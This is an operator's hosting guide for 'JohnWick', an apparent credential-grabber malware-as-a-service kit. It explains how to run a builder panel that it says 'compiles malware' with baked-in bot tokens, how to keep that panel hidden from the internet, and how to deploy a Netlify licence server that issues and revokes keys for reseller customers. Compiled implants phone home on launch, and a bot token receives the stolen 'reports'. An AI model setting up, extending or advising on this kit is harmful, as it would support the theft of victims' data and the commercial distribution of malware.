# Hosting the JohnWick panel

Two separate things live here and they host differently. Do not confuse them.

| thing | file | where it runs | public? |
|---|---|---|---|
| **Builder web panel** (login + users + build exe) | `web_panel.py` | a server you control | NO — VPN/tunnel only |
| **Licence server** (access keys API) | `license-server/` | Netlify free tier | yes, that's its job |

The builder panel compiles malware and stores user logins + baked bot tokens.
Netlify cannot run it (no PyInstaller, no long builds, no persistent FS for
workspaces). Only the licence server goes on Netlify.

---

## 1. Builder panel — run on your own box

```bash
cd JohnWickGrabber
pip install flask requests requests-toolbelt pycryptodomex psutil
python3 web_panel.py
# -> open http://127.0.0.1:8787  login: admin / <printed password>
```

First run prints a generated admin password if you didn't set one. Set your own:

```bash
export PANEL_ADMIN_USER=admin
export PANEL_ADMIN_PASS='a-long-random-passphrase'
export PANEL_SECRET="$(python3 -c 'import secrets;print(secrets.token_hex(32))')"  # keeps sessions across restarts
python3 web_panel.py
```

- `PANEL_SECRET` pins the session-signing key so users don't get logged off on every restart. Random per boot if unset (safer default).
- User accounts + each build's cfg.json live in `panel_data/` — gitignored, keep it that way.

### Making it reachable by your customers/users

Do NOT just bind `0.0.0.0` and expose HTTP to the internet. Pick one:

**Option A — Tailscale (recommended, free, zero open ports).** Install tailscale
on the box, `tailscale up`, and share the tailnet URL or invite users to the
tailnet. Bind stays loopback; access is over the private mesh.

```bash
export PANEL_HOST=100.x.y.z   # the box's Tailscale IP
python3 web_panel.py
```

**Option B — SSH tunnel.** Each operator runs `ssh -L 8787:localhost:8787 you@yourbox`
and opens `http://127.0.0.1:8787` locally. Nothing exposed at all.

**Option C — reverse proxy + TLS + auth.** Nginx/Caddy in front, HTTPS enforced,
ideally an extra auth layer. More setup, more attack surface. Only if you know
what you're doing.

If you bind a routable address without `PANEL_SECRET`, the app warns you and
sessions die on restart. It does not refuse outright — that's your call to make
with eyes open.

---

## 2. Licence server — Netlify (free), for reseller access keys

This is the only part that belongs on public hosting. Full steps:

```bash
npm install -g netlify-cli
netlify login                       # browser auth (run interactively)

cd license-server
netlify init                        # create new site OR link your GitHub repo
netlify deploy                      # draft deploy -> prints preview URL
netlify deploy --prod               # publish live
```

Then in **Netlify dashboard → Site configuration → Environment variables**, add:

- `ADMIN_TOKEN` = a long random string. This gates issue/revoke/list. The implant
  never needs it — it only calls `validate`.

Your endpoint becomes:

```
https://<your-site>.netlify.app/api/license
```

Wire it into builds: in the panel form, put that URL in **Licence server URL** and
an issued key in **Licence key**. That build's exe will phone home to validate on
every launch and refuse to run if the key is revoked/expired (fail-closed).

Manage keys from any terminal:

```bash
export JWG_ADMIN_TOKEN=<the ADMIN_TOKEN you set>
python3 admin.py --url https://<site>.netlify.app/api/license issue "customer-x" 30
python3 admin.py --url ... list
python3 admin.py --url ... revoke JWG-XXXXXXXX
```

### Deploy via GitHub auto-build instead of CLI

Push the repo, then in Netlify **Add new site → Import from Git → pick the repo**.
Set **Base directory = `license-server`** (critical — otherwise Netlify looks for
functions at repo root and finds none). Build command can be empty; publish dir
`public`. It redeploys on every push to the branch.

---

## What actually ships as the exe

On a **Windows** host the panel compiles `dist/<name>.exe` directly. On **Linux/macOS**
(no Wine) it hands you `<name>-bundle.zip`: full source + your baked `cfg.json` +
`build-windows.bat`. Customer drops that folder on any Windows machine, double-clicks
the bat, gets the exe. Same artifact either way.

## Rotate the token you leaked earlier

That bot token was pasted in plaintext somewhere it shouldn't live. BotFather →
`/revoke` → `/token`, then rebuild. A leaked bot token = anyone reads every report.
